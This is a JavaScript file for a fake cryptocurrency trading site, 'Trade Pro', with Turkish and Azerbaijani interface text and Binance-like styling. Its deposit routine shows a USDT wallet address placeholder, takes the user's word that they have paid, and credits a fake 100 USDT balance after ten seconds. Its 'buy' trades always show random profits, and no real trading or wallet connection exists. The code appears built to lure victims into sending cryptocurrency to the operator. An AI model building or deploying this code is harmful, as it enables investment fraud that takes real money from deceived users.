// --- TRADE PRO FULL LOGIC (Qlobus + Realistik Trade) ---

let balance = 0.00;
let hasDeposited = false;

// 1. DİL MENYUSU (Qlobus üçün mütləqdir)
function toggleLangMenu() {
    const menu = document.getElementById('langMenu');
    if (menu) {
        menu.style.display = menu.style.display === 'flex' ? 'none' : 'flex';
    }
}

function changeLanguage(lang) {
    const translations = {
        'az': {
            login: 'Giriş Et', register: 'Qeydiyyat',
            noAcc: 'Hesabınız yoxdur? <span class="binance-yellow cursor-pointer underline" onclick="toggleAuth()">Qeydiyyat</span>',
            hasAcc: 'Artıq hesabınız var? <span class="binance-yellow cursor-pointer underline" onclick="toggleAuth()">Giriş</span>',
            wallet: 'Cüzdanı Bağla', dep: 'YATIRIM ET', wit: 'PUL ÇIXAR'
        },
        'tr': {
            login: 'Giriş Yap', register: 'Kayıt Ol',
            noAcc: 'Hesabınız yok mu? <span class="binance-yellow cursor-pointer underline" onclick="toggleAuth()">Hemen Kaydol</span>',
            hasAcc: 'Zaten üye misiniz? <span class="binance-yellow cursor-pointer underline" onclick="toggleAuth()">Giriş Yap</span>',
            wallet: 'Cüzdanı Bağla', dep: 'YATIRIM YAP', wit: 'PARA ÇEK'
        }
    };

    if (translations[lang]) {
        document.getElementById('login-btn').innerText = translations[lang].login;
        document.getElementById('reg-btn').innerText = translations[lang].register;
        document.getElementById('no-acc-text').innerHTML = translations[lang].noAcc;
        document.getElementById('has-acc-text').innerHTML = translations[lang].hasAcc;
        document.getElementById('wallet-btn').innerText = translations[lang].wallet;
        document.getElementById('dep-btn').innerText = translations[lang].dep;
        document.getElementById('wit-btn').innerText = translations[lang].wit;
    }
    toggleLangMenu();
}

// 2. GİRİŞ VƏ QRAFİK
function login() {
    const user = document.getElementById('user-input').value;
    if(user === "") { alert("Lütfen kullanıcı adınızı girin!"); return; }

    document.getElementById('authModal').classList.add('hidden');
    document.getElementById('mainContent').classList.remove('hidden');
    
    new TradingView.widget({
        "autosize": true, "symbol": "BINANCE:BTCUSDT", "interval": "1",
        "theme": "dark", "style": "1", "locale": "tr", "container_id": "tradingview_btc"
    });
}

// 3. YATIRIM (Test üçün 10 saniyə sonra 100$ verir)
function deposit() {
    const myAddress = "TS2b7...ADRESINI_BURA_YAZ"; 
    alert("Yatırım yapmadan ticaret başlayamaz.\n\nUSDT (TRC-20) Adresiniz:\n" + myAddress);
    
    let confirmPay = confirm("Ödemeyi yaptınız mı?");
    if(confirmPay) {
        alert("İşleminiz onaylanıyor... 10 saniye bekleyin.");
        setTimeout(() => {
            balance = 100.00;
            hasDeposited = true;
            updateUI();
            alert("Tebrikler! 100 USDT hesabınıza tanımlandı.");
        }, 10000);
    }
}

// 4. AL/SAT (Trade sistemi)
function trade(type) {
    if(!hasDeposited) {
        alert("Bakiyeniz 0.00! Lütfen önce yatırım yapın.");
        return;
    }

    let profit = (Math.random() * 4.5).toFixed(2);
    if(type === 'buy') {
        balance = parseFloat(balance) + parseFloat(profit);
        alert("Alış emri verildi! Kar: +" + profit + " USDT");
    } else {
        balance = parseFloat(balance) - (profit / 2.5);
        alert("Satış yapıldı. Zarar minimize edildi.");
    }
    updateUI();
}

function updateUI() {
    document.getElementById('user-balance').innerText = balance.toFixed(2);
}

function toggleAuth() {
    document.getElementById('loginForm').classList.toggle('hidden');
    document.getElementById('registerForm').classList.toggle('hidden');
}

function connectWallet() {
    alert("Cüzdan bağlanıyor...");
}
